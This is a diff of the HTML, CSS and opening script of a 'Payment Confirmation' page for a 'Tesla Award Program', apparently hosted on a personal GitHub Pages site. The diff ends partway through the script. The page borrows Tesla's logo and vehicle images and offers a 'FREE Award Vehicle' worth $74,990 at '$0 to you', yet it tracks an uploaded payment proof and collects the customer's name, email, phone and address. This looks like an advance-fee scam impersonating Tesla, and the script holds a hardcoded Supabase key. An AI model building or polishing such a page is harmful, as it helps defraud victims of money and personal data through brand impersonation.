@@ -4,268 +4,737 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Payment Confirmation - Tesla Award Program</title>
-  <meta name="description" content="View your payment confirmation status for the Tesla Award Program.">
+  <meta name="description" content="View your payment confirmation and delivery progress for the Tesla Award Program.">
   <link rel="canonical" href="https://joshbond123.github.io/Tesla/payment-confirmation.html">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="Payment Confirmation - Tesla Award Program">
-  <meta property="og:description" content="Track your payment status for the Tesla Award Program.">
   <link rel="icon" type="image/png" href="assets/tesla-logo.png">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
   <link rel="stylesheet" href="css/style.css">
   <style>
-    :root{--success:#00A550;--warning:#F59E0B;--danger:#EF4444;--info:#3B82F6}
-    *{box-sizing:border-box}
-    body{background:#f5f5f7;font-family:Inter,-apple-system,sans-serif;color:#171A20}
-    .page-wrap{max-width:820px;margin:0 auto;padding:88px 24px 64px}
-    .conf-card{background:white;border-radius:24px;box-shadow:0 20px 64px rgba(0,0,0,.09);overflow:hidden;animation:fadeInUp .5s ease;animation-fill-mode:forwards}
-    .conf-header{padding:48px 48px 40px;text-align:center;transition:all .4s ease}
-    .conf-header.pending{background:linear-gradient(135deg,#fef3c7,#fde68a);border-bottom:4px solid var(--warning)}
-    .conf-header.approved{background:linear-gradient(135deg,#d1fae5,#a7f3d0);border-bottom:4px solid var(--success)}
-    .conf-header.rejected{background:linear-gradient(135deg,#fee2e2,#fecaca);border-bottom:4px solid var(--danger)}
-    .conf-icon{width:72px;height:72px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:36px}
-    .conf-header.pending .conf-icon{background:rgba(245,158,11,.15);border:2px solid rgba(245,158,11,.3)}
-    .conf-header.approved .conf-icon{background:rgba(0,165,80,.15);border:2px solid rgba(0,165,80,.3)}
-    .conf-header.rejected .conf-icon{background:rgba(239,68,68,.15);border:2px solid rgba(239,68,68,.3)}
-    .conf-title{font-size:28px;font-weight:900;margin-bottom:6px;letter-spacing:-.5px}
-    .conf-header.pending .conf-title{color:#92400E}
-    .conf-header.approved .conf-title{color:#065F46}
-    .conf-header.rejected .conf-title{color:#991B1B}
-    .conf-sub{font-size:15px;line-height:1.65;max-width:480px;margin:0 auto}
-    .conf-header.pending .conf-sub{color:#92400E}
-    .conf-header.approved .conf-sub{color:#065F46}
-    .conf-header.rejected .conf-sub{color:#991B1B}
-    .conf-body{padding:36px 48px 48px}
-    @media(max-width:560px){.conf-header{padding:36px 20px 28px}.conf-body{padding:24px 16px 32px}.conf-title{font-size:22px}}
-    .section-title{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:#888;margin-bottom:16px;display:flex;align-items:center;gap:8px}
-    .order-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:28px}
-    @media(max-width:640px){.order-grid{grid-template-columns:1fr}}
-    .detail-card{background:#f8f9fa;border-radius:14px;padding:20px;border:1px solid rgba(0,0,0,.04)}
-    .detail-row{display:flex;justify-content:space-between;padding:8px 0;font-size:14px}
-    .detail-row:not(:last-child){border-bottom:1px solid rgba(0,0,0,.05)}
-    .dr-key{color:#888}.dr-val{color:#111;font-weight:600;text-align:right;max-width:60%}
-    .dr-val.green{color:var(--success)}.dr-val.red{color:var(--danger)}.dr-val.orange{color:var(--warning)}
-    .dr-val.mono{font-family:monospace;font-size:13px}
-    .status-badge{display:inline-flex;align-items:center;gap:8px;padding:6px 16px;border-radius:999px;font-size:14px;font-weight:700}
-    .status-badge.pending{background:rgba(245,158,11,.1);color:#92400E}
-    .status-badge.approved{background:rgba(0,165,80,.1);color:#065F46}
-    .status-badge.rejected{background:rgba(239,68,68,.1);color:#991B1B}
-    .action-bar{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-top:28px;padding-top:24px;border-top:1px solid #eee}
-    .proof-preview{max-width:100%;max-height:300px;border-radius:12px;box-shadow:0 4px 16px rgba(0,0,0,.08);margin-bottom:16px}
-    .car-display{display:flex;align-items:center;gap:16px;padding:16px 20px;background:#f8f9fa;border-radius:14px;margin-bottom:20px;border:1px solid rgba(0,0,0,.04)}
-    .car-display img{height:80px;object-fit:contain;filter:drop-shadow(0 2px 6px rgba(0,0,0,.08))}
-    .car-display .cd-name{font-size:18px;font-weight:800;color:#111}
-    .car-display .cd-detail{font-size:13px;color:#888}
-    .status-msg{display:none;border-radius:12px;padding:20px 24px;margin-bottom:16px}
-    .status-msg.show{display:block;animation:fadeInUp .35s ease}
-    .status-msg .sm-inner{display:flex;align-items:flex-start;gap:12px}
-    .status-msg .sm-icon{font-size:24px;flex-shrink:0}
-    .status-msg .sm-title{font-size:15px;font-weight:800;margin-bottom:4px}
-    .status-msg .sm-text{font-size:13px;line-height:1.6}
-    .status-msg.pending{background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2)}
-    .status-msg.pending .sm-title{color:#92400E}
-    .status-msg.pending .sm-text{color:#92400E}
-    .status-msg.approved{background:rgba(0,165,80,.08);border:1px solid rgba(0,165,80,.2)}
-    .status-msg.approved .sm-title{color:#065F46}
-    .status-msg.approved .sm-text{color:#065F46}
-    .status-msg.rejected{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2)}
-    .status-msg.rejected .sm-title{color:#991B1B}
-    .status-msg.rejected .sm-text{color:#991B1B}
+    :root {
+      --red: #E31937;
+      --green: #00A550;
+      --orange: #F59E0B;
+      --blue: #3B82F6;
+      --dark: #171A20;
+      --bg: #f5f5f7;
+      --card-shadow: 0 4px 24px rgba(0,0,0,.07);
+    }
+    * { box-sizing: border-box; }
+    body { background: var(--bg); font-family: Inter, -apple-system, sans-serif; color: var(--dark); margin: 0; }
+    .page-wrap { max-width: 860px; margin: 0 auto; padding: 88px 20px 80px; }
+
+    /* ── HERO HEADER ── */
+    .conf-hero {
+      background: white;
+      border-radius: 24px;
+      box-shadow: 0 20px 64px rgba(0,0,0,.1);
+      overflow: hidden;
+      margin-bottom: 24px;
+      position: relative;
+    }
+    .conf-hero::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, var(--red), #ff6b6b);
+    }
+    .hero-top {
+      padding: 44px 48px 36px;
+      text-align: center;
+      border-bottom: 1px solid rgba(0,0,0,.06);
+      transition: background .4s ease;
+    }
+    .hero-top.pending { background: linear-gradient(135deg, #fffbeb, #fef3c7); }
+    .hero-top.approved { background: linear-gradient(135deg, #f0fdf4, #dcfce7); }
+    .hero-top.rejected { background: linear-gradient(135deg, #fef2f2, #fee2e2); }
+    .status-icon {
+      width: 72px; height: 72px;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 20px;
+      font-size: 32px;
+    }
+    .pending .status-icon { background: rgba(245,158,11,.12); border: 2px solid rgba(245,158,11,.3); }
+    .approved .status-icon { background: rgba(0,165,80,.12); border: 2px solid rgba(0,165,80,.3); }
+    .rejected .status-icon { background: rgba(239,68,68,.12); border: 2px solid rgba(239,68,68,.3); }
+    .hero-title { font-size: 30px; font-weight: 900; letter-spacing: -.5px; margin-bottom: 8px; }
+    .pending .hero-title { color: #92400e; }
+    .approved .hero-title { color: #14532d; }
+    .rejected .hero-title { color: #7f1d1d; }
+    .hero-sub { font-size: 15px; line-height: 1.7; max-width: 500px; margin: 0 auto 20px; }
+    .pending .hero-sub { color: #78350f; }
+    .approved .hero-sub { color: #15803d; }
+    .rejected .hero-sub { color: #991b1b; }
+    .status-pill {
+      display: inline-flex; align-items: center; gap: 8px;
+      padding: 7px 18px;
+      border-radius: 999px;
+      font-size: 14px; font-weight: 700;
+    }
+    .pending .status-pill { background: rgba(245,158,11,.15); color: #92400e; }
+    .approved .status-pill { background: rgba(0,165,80,.15); color: #14532d; }
+    .rejected .status-pill { background: rgba(239,68,68,.15); color: #7f1d1d; }
+    .pulse { width: 8px; height: 8px; border-radius: 50%; animation: pulseAnim 1.5s infinite; }
+    .pending .pulse { background: var(--orange); }
+    .approved .pulse { background: var(--green); }
+    .rejected .pulse { background: #EF4444; }
+    @keyframes pulseAnim { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.6;transform:scale(.85)} }
+
+    /* ── VEHICLE HERO ── */
+    .vehicle-card {
+      background: white;
+      border-radius: 20px;
+      box-shadow: var(--card-shadow);
+      padding: 28px 32px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      gap: 28px;
+    }
+    @media(max-width:560px){ .vehicle-card{flex-direction:column;text-align:center;padding:24px 20px;} }
+    .vehicle-img-wrap { flex-shrink: 0; }
+    .vehicle-img-wrap img { height: 120px; object-fit: contain; filter: drop-shadow(0 8px 20px rgba(0,0,0,.12)); }
+    .vehicle-name { font-size: 26px; font-weight: 900; color: var(--dark); margin-bottom: 4px; }
+    .vehicle-badge {
+      display: inline-block;
+      background: var(--red);
+      color: white;
+      font-size: 11px; font-weight: 700;
+      padding: 4px 12px;
+      border-radius: 20px;
+      text-transform: uppercase; letter-spacing: .06em;
+      margin-bottom: 8px;
+    }
+    .vehicle-price { font-size: 14px; color: #888; }
+    .vehicle-price .free { color: var(--red); font-weight: 700; }
+
+    /* ── GRID ── */
+    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
+    @media(max-width:640px){ .info-grid{grid-template-columns:1fr;} }
+
+    .info-card {
+      background: white;
+      border-radius: 20px;
+      box-shadow: var(--card-shadow);
+      padding: 24px;
+    }
+    .card-label {
+      font-size: 11px; font-weight: 700;
+      text-transform: uppercase; letter-spacing: .08em;
+      color: #999;
+      margin-bottom: 16px;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .card-label svg { opacity: .6; }
+    .detail-row {
+      display: flex; justify-content: space-between; align-items: flex-start;
+      padding: 9px 0;
+      font-size: 14px;
+    }
+    .detail-row:not(:last-child) { border-bottom: 1px solid rgba(0,0,0,.05); }
+    .dr-key { color: #888; flex-shrink: 0; margin-right: 12px; }
+    .dr-val { color: #111; font-weight: 600; text-align: right; word-break: break-word; }
+    .dr-val.mono { font-family: 'Courier New', monospace; font-size: 12px; color: var(--red); }
+    .dr-val.green { color: var(--green); }
+    .dr-val.orange { color: var(--orange); }
+
+    /* ── DELIVERY PROGRESS TIMELINE ── */
+    .timeline-card {
+      background: white;
+      border-radius: 20px;
+      box-shadow: var(--card-shadow);
+      padding: 28px 32px;
+      margin-bottom: 20px;
+    }
+    .timeline-header {
+      display: flex; align-items: center; justify-content: space-between;
+      margin-bottom: 28px;
+    }
+    .timeline-header h3 {
+      font-size: 12px; font-weight: 700;
+      text-transform: uppercase; letter-spacing: .08em;
+      color: #999; margin: 0;
+    }
+    .progress-track {
+      height: 4px;
+      background: rgba(0,0,0,.08);
+      border-radius: 4px;
+      margin-bottom: 28px;
+      overflow: hidden;
+    }
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--red), #ff6b6b);
+      border-radius: 4px;
+      transition: width .8s ease;
+    }
+    .tl-steps {
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+    .tl-step {
+      display: flex;
+      gap: 20px;
+      padding: 12px 0;
+      position: relative;
+    }
+    .tl-step:not(:last-child)::after {
+      content: '';
+      position: absolute;
+      left: 20px; top: 48px;
+      width: 2px;
+      bottom: -2px;
+      background: rgba(0,0,0,.08);
+    }
+    .tl-step.done::after { background: var(--green); }
+    .tl-step.current::after { background: linear-gradient(to bottom, var(--red), rgba(0,0,0,.08)); }
+    .tl-dot {
+      width: 40px; height: 40px;
+      flex-shrink: 0;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 16px;
+      border: 2px solid rgba(0,0,0,.1);
+      background: white;
+      z-index: 1;
+      position: relative;
+    }
+    .tl-step.done .tl-dot {
+      background: var(--green);
+      border-color: var(--green);
+      color: white;
+      font-size: 16px;
+    }
+    .tl-step.current .tl-dot {
+      background: var(--red);
+      border-color: var(--red);
+      color: white;
+    }
+    .tl-step.upcoming .tl-dot { background: #f5f5f7; border-color: rgba(0,0,0,.1); color: #bbb; }
+    .tl-info { flex: 1; padding-top: 8px; }
+    .tl-stage { font-size: 15px; font-weight: 700; color: #111; }
+    .tl-step.upcoming .tl-stage { color: #aaa; }
+    .tl-time { font-size: 13px; color: #888; margin-top: 3px; }
+    .tl-step.current .tl-stage { color: var(--red); }
+    .tl-current-badge {
+      display: inline-flex; align-items: center; gap: 5px;
+      background: rgba(227,25,55,.1); color: var(--red);
+      font-size: 11px; font-weight: 700;
+      padding: 3px 10px; border-radius: 999px;
+      margin-left: 8px;
+      vertical-align: middle;
+    }
+    .tl-current-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--red); animation: pulseAnim 1.5s infinite; }
+
+    /* ── MAP ── */
+    .map-card {
+      background: white;
+      border-radius: 20px;
+      box-shadow: var(--card-shadow);
+      padding: 24px;
+      margin-bottom: 20px;
+    }
+    .map-card h3 {
+      font-size: 12px; font-weight: 700;
+      text-transform: uppercase; letter-spacing: .08em;
+      color: #999; margin-bottom: 16px;
+    }
+    #confMap { height: 300px; border-radius: 14px; overflow: hidden; }
+
+    /* ── PROOF ── */
+    .proof-card {
+      background: white;
+      border-radius: 20px;
+      box-shadow: var(--card-shadow);
+      padding: 24px;
+      margin-bottom: 20px;
+    }
+    .proof-img { max-width: 100%; border-radius: 12px; border: 1.5px solid rgba(0,0,0,.07); }
+
+    /* ── ACTION BUTTONS ── */
+    .action-bar { display: flex; gap: 14px; flex-wrap: wrap; margin-top: 8px; }
+    .btn-primary {
+      background: linear-gradient(135deg, var(--red), #c41030);
+      color: white;
+      border: none; cursor: pointer;
+      padding: 14px 28px;
+      border-radius: 14px;
+      font-size: 15px; font-weight: 700;
+      display: inline-flex; align-items: center; gap: 8px;
+      text-decoration: none;
+      box-shadow: 0 6px 20px rgba(227,25,55,.3);
+      transition: transform .15s, box-shadow .15s;
+    }
+    .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 8px 28px rgba(227,25,55,.4); }
+    .btn-outline {
+      background: white;
+      color: #555;
+      border: 1.5px solid rgba(0,0,0,.12);
+      cursor: pointer;
+      padding: 14px 28px;
+      border-radius: 14px;
+      font-size: 15px; font-weight: 600;
+      display: inline-flex; align-items: center; gap: 8px;
+      text-decoration: none;
+      transition: border-color .15s, color .15s;
+    }
+    .btn-outline:hover { border-color: var(--red); color: var(--red); }
+
+    /* ── SKELETON LOADER ── */
+    .skel { background: linear-gradient(90deg, #f0f0f0 25%, #e8e8e8 50%, #f0f0f0 75%); background-size: 200% 100%; animation: skelShim 1.4s infinite; border-radius: 8px; height: 16px; margin: 4px 0; }
+    @keyframes skelShim { 0%{background-position:200% 0} 100%{background-position:-200% 0} }
+
+    @media(max-width:560px) {
+      .timeline-card, .map-card, .proof-card { padding: 20px 16px; }
+      .hero-top { padding: 32px 20px 24px; }
+      .vehicle-card { padding: 20px; }
+      .info-card { padding: 20px 16px; }
+    }
+    @keyframes fadeUp { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)} }
+    .fade-up { animation: fadeUp .5s ease forwards; }
   </style>
 </head>
 <body>
-<nav class="nav">
+<nav class="navbar" id="navbar">
   <div class="nav-inner">
     <a href="index.html" class="nav-logo">
-      <img src="assets/tesla-logo.png" alt="Tesla" style="height:30px;width:auto;vertical-align:middle;">
+      <img src="assets/tesla-logo.png" alt="Tesla" style="height:32px;object-fit:contain;">
     </a>
-    <button onclick="if(localStorage)localStorage.clear();window.location.href='index.html'" class="btn btn-ghost" style="font-size:14px;">Sign Out</button>
+    <div style="font-size:13px;font-weight:600;color:#555;">Payment Confirmation</div>
   </div>
 </nav>
 
 <div class="page-wrap">
-  <div class="conf-card">
-    <div class="conf-header pending" id="confHeader">
-      <div class="conf-icon" id="confIcon"><svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg></div>
-      <h1 class="conf-title" id="confTitle">Payment Under Review</h1>
-      <p class="conf-sub" id="confSub">Your payment proof has been received and is awaiting verification.</p>
+  <!-- Hero Status -->
+  <div class="conf-hero fade-up" id="confHero">
+    <div class="hero-top pending" id="heroTop">
+      <div class="status-icon" id="statusIcon">⏳</div>
+      <div class="hero-title" id="heroTitle">Payment Under Review</div>
+      <div class="hero-sub" id="heroSub">Your payment proof has been received. Our team is verifying your submission. This typically takes 24–48 hours.</div>
+      <div><span class="status-pill" id="statusPill"><span class="pulse"></span> <span id="statusText">Pending Review</span></span></div>
+    </div>
+  </div>
+
+  <!-- Vehicle -->
+  <div class="vehicle-card fade-up" id="vehicleCard" style="animation-delay:.08s">
+    <div class="vehicle-img-wrap">
+      <img id="vehicleImg" src="https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-S.png" alt="Tesla">
+    </div>
+    <div>
+      <div class="vehicle-badge">FREE Award Vehicle</div>
+      <div class="vehicle-name" id="vehicleName">Tesla Model S</div>
+      <div class="vehicle-price">Retail Value: <span id="vehiclePrice">$74,990</span> &nbsp;·&nbsp; <span class="free">$0 to you</span></div>
+    </div>
+  </div>
+
+  <!-- Info Grid -->
+  <div class="info-grid">
+    <!-- Order Summary -->
+    <div class="info-card fade-up" style="animation-delay:.12s">
+      <div class="card-label">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
+        Order Summary
+      </div>
+      <div class="detail-row"><span class="dr-key">Order ID</span><span class="dr-val mono" id="orderId">—</span></div>
+      <div class="detail-row"><span class="dr-key">Tracking #</span><span class="dr-val mono" id="trackingNum">—</span></div>
+      <div class="detail-row"><span class="dr-key">Order Date</span><span class="dr-val" id="orderDate">—</span></div>
+      <div class="detail-row"><span class="dr-key">Est. Delivery</span><span class="dr-val green" id="estDelivery">—</span></div>
+      <div class="detail-row"><span class="dr-key">Payment</span><span class="dr-val" id="paymentMethod">—</span></div>
+      <div class="detail-row"><span class="dr-key">Delivery</span><span class="dr-val" id="deliveryMethod">—</span></div>
     </div>
 
-    <div class="conf-body">
-      <div class="car-display" id="carDisplay">
-        <img id="carImg" src="" alt="Tesla" onerror="this.style.display='none'">
-        <div>
-          <div class="cd-name" id="carName">Tesla -</div>
-          <div class="cd-detail" id="carDetail">Award Vehicle</div>
-        </div>
+    <!-- Customer Info -->
+    <div class="info-card fade-up" style="animation-delay:.16s">
+      <div class="card-label">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/></svg>
+        Customer Information
       </div>
+      <div class="detail-row"><span class="dr-key">Name</span><span class="dr-val" id="custName">—</span></div>
+      <div class="detail-row"><span class="dr-key">Email</span><span class="dr-val" id="custEmail" style="font-size:13px">—</span></div>
+      <div class="detail-row"><span class="dr-key">Phone</span><span class="dr-val" id="custPhone">—</span></div>
+    </div>
 
-      <div class="order-grid">
-        <div class="detail-card">
-          <div class="section-title">Order Details</div>
-          <div class="detail-row"><span class="dr-key">Order ID</span><span class="dr-val mono" id="orderId">-</span></div>
-          <div class="detail-row"><span class="dr-key">Order Date</span><span class="dr-val" id="orderDate">-</span></div>
-          <div class="detail-row"><span class="dr-key">Est. Delivery</span><span class="dr-val green" id="estDelivery">-</span></div>
-          <div class="detail-row"><span class="dr-key">Delivery Method</span><span class="dr-val" id="delivMethod">-</span></div>
-          <div class="detail-row"><span class="dr-key">Status</span><span class="dr-val" id="orderStatus">-</span></div>
-        </div>
-        <div class="detail-card">
-          <div class="section-title">Customer Info</div>
-          <div class="detail-row"><span class="dr-key">Full Name</span><span class="dr-val" id="customerName">-</span></div>
-          <div class="detail-row"><span class="dr-key">Email</span><span class="dr-val" id="customerEmail">-</span></div>
-          <div class="detail-row"><span class="dr-key">Phone</span><span class="dr-val" id="customerPhone">-</span></div>
-          <div class="detail-row"><span class="dr-key">Delivery Address</span><span class="dr-val" id="customerAddr" style="font-size:13px;max-width:55%;">-</span></div>
-        </div>
+    <!-- Delivery Address -->
+    <div class="info-card fade-up" style="animation-delay:.20s">
+      <div class="card-label">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+        Delivery Address
       </div>
+      <div class="detail-row"><span class="dr-key">Name</span><span class="dr-val" id="delName">—</span></div>
+      <div class="detail-row"><span class="dr-key">Address</span><span class="dr-val" id="delAddr">—</span></div>
+      <div class="detail-row"><span class="dr-key">City</span><span class="dr-val" id="delCity">—</span></div>
+      <div class="detail-row"><span class="dr-key">State / ZIP</span><span class="dr-val" id="delStateZip">—</span></div>
+      <div class="detail-row"><span class="dr-key">Country</span><span class="dr-val" id="delCountry">—</span></div>
+    </div>
 
-      <div class="detail-card" style="margin-bottom:20px;">
-        <div class="section-title">Payment Method</div>
-        <div class="detail-row"><span class="dr-key">Method</span><span class="dr-val" id="payMethod">-</span></div>
-        <div class="detail-row"><span class="dr-key">Amount</span><span class="dr-val red" id="payAmount">-</span></div>
-        <div class="detail-row"><span class="dr-key">Submitted</span><span class="dr-val" id="payDate">-</span></div>
+    <!-- Payment Status -->
+    <div class="info-card fade-up" style="animation-delay:.24s">
+      <div class="card-label">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+        Payment Details
       </div>
-
-      <div id="proofPreviewSection" style="margin-bottom:20px;display:none;">
-        <div class="section-title">Payment Proof</div>
-        <img class="proof-preview" id="proofPreview" src="" alt="Payment proof">
-      </div>
-
-      <div class="status-msg pending show" id="pendingMessage">
-        <div class="sm-inner"><span class="sm-icon">&#8987;</span><div><div class="sm-title">Awaiting Review</div><div class="sm-text">Your payment proof has been uploaded successfully. Our team will review it shortly. You will receive a notification once it has been reviewed.</div></div></div>
-      </div>
-      <div class="status-msg approved" id="approvedMessage">
-        <div class="sm-inner"><span class="sm-icon">&#10004;&#65039;</span><div><div class="sm-title">Payment Approved!</div><div class="sm-text">Your payment has been verified and approved. Your order is now confirmed and being processed.</div></div></div>
-      </div>
-      <div class="status-msg rejected" id="rejectedMessage">
-        <div class="sm-inner"><span class="sm-icon">&#10060;</span><div><div class="sm-title">Payment Rejected</div><div class="sm-text" id="rejectionReason">Your payment proof could not be verified. Please submit a new payment proof below.</div></div></div>
-      </div>
-
-      <div class="action-bar" id="actionBar">
-        <button class="btn btn-ghost btn-lg" onclick="goToTrack()" id="trackOrderBtn" style="display:none;">&#128205; Track Order</button>
-        <a href="payment.html" class="btn btn-primary btn-lg" id="returnToPaymentBtn" style="display:none;">&#8617; Return to Payment Page</a>
-        <button class="btn btn-ghost btn-lg" onclick="window.location.href='dashboard.html'">&#8592; Back to Dashboard</button>
+      <div class="detail-row"><span class="dr-key">Proof Status</span><span class="dr-val" id="proofStatus">—</span></div>
+      <div class="detail-row"><span class="dr-key">Submitted</span><span class="dr-val" id="proofDate">—</span></div>
+      <div class="detail-row"><span class="dr-key">Method</span><span class="dr-val" id="proofMethod">—</span></div>
+      <div id="proofImgWrap" style="display:none;margin-top:12px;">
+        <img id="proofImg" class="proof-img" src="" alt="Payment Proof">
       </div>
     </div>
+  </div>
+
+  <!-- Delivery Progress Timeline -->
+  <div class="timeline-card fade-up" style="animation-delay:.28s">
+    <div class="timeline-header">
+      <h3>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:6px;vertical-align:-.15em"><path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z"/><polyline points="12 6 12 12 16 14"/></svg>
+        Delivery Progress
+      </h3>
+      <div id="progressLabel" style="font-size:13px;font-weight:600;color:#888;">Loading…</div>
+    </div>
+    <div class="progress-track">
+      <div class="progress-fill" id="progressFill" style="width:0%"></div>
+    </div>
+    <div class="tl-steps" id="tlSteps">
+      <!-- Filled by JS -->
+    </div>
+  </div>
+
+  <!-- Delivery Map -->
+  <div class="map-card fade-up" style="animation-delay:.32s" id="mapCard">
+    <h3>
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:6px;vertical-align:-.15em"><path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+      Live Delivery Map
+    </h3>
+    <div id="confMap"></div>
+  </div>
+
+  <!-- Action Buttons -->
+  <div class="action-bar fade-up" style="animation-delay:.36s">
+    <button class="btn-primary" onclick="location.reload()">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23,4 23,10 17,10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+      Refresh Status
+    </button>
+    <a class="btn-outline" href="track.html" id="trackBtn">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+      Track Order
+    </a>
+    <a class="btn-outline" href="index.html">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9,22 9,12 15,12 15,22"/></svg>
+      Home
+    </a>
   </div>
 </div>
 
 <script src="js/config.js"></script>
 <script src="js/app.js"></script>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-(function(){
-  function gp(n){return new URLSearchParams(window.location.search).get(n);}
+(function() {
+  'use strict';
 
-  // Load order from localStorage (set by payment.html before cart is cleared)
-  var o = JSON.parse(localStorage.getItem("tesla_last_order") || "null");
+  var SUPABASE_URL = (window.SUPABASE_URL || 'https://puebwzumwqizgbmksrpq.supabase.co');
+  var SUPABASE_ANON_KEY = (window.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB1ZWJ3enVtd3FpemdibWtzcnBxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU5ODEyMjYsImV4cCI6MjA2MTU1NzIyNn0.kfup1Lsb8vnvKLjAH0r-SM5mqLYMttOzQsN7YT6ISrw');
 
-  // Derive orderId and status: prefer stored order > URL param
-  var oi  = (o && o.orderId) || gp("orderId") || "";
-  var st  = gp("status") || (o && o.status) || "pending";
+  var params = new URLSearchParams(window.location.search);
+  var urlOrderId = params.get('order') || '';
 
-  // Car may still be in last_order.car (payment.html stores it there)
-  var sc  = (o && o.car) || JSON.parse(localStorage.getItem("tesla_selected_car") || "null");
+  // Vehicle image map
+  var carImgMap = {
+    cybertruck: 'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Cybertruck.png',
+    modely:     'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-Y.png',
+    models:     'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-S.png',
+    model3:     'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-3.png',
+    modelx:     'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-X.png',
+    roadster:   'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/tesla-roadster.png'
+  };
 
-  function setStatus(s){
-    var h=document.getElementById("confHeader");
-    if(!h)return;
-    h.className="conf-header "+s;
-    document.getElementById("pendingMessage").className="status-msg pending"+(s==="pending"?" show":"");
-    document.getElementById("approvedMessage").className="status-msg approved"+(s==="approved"?" show":"");
-    document.getElementById("rejectedMessage").className="status-msg rejected"+(s==="rejected"?" show":"");
-    document.getElementById("trackOrderBtn").style.display=s==="approved"?"inline-flex":"none";
-    document.getElementById("returnToPaymentBtn").style.display=s==="rejected"?"inline-flex":"none";
-    var ic=document.getElementById("confIcon"),t=document.getElementById("confTitle"),sb=document.getElementById("confSub");
-    if(!ic||!t||!sb)return;
-    if(s==="pending"){
-      ic.innerHTML='<svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>';
-      t.textContent="Payment Under Review";
-      sb.textContent="Your payment proof has been received and is awaiting verification.";
-    } else if(s==="approved"){
-      ic.innerHTML='<svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20,6 9,17 4,12"/></svg>';
-      t.textContent="Payment Approved!";
-      sb.textContent="Your payment has been verified successfully. Your order is confirmed!";
+  var stageIcons  = ['📋', '⚙️', '📦', '🚚', '🏠', '✅'];
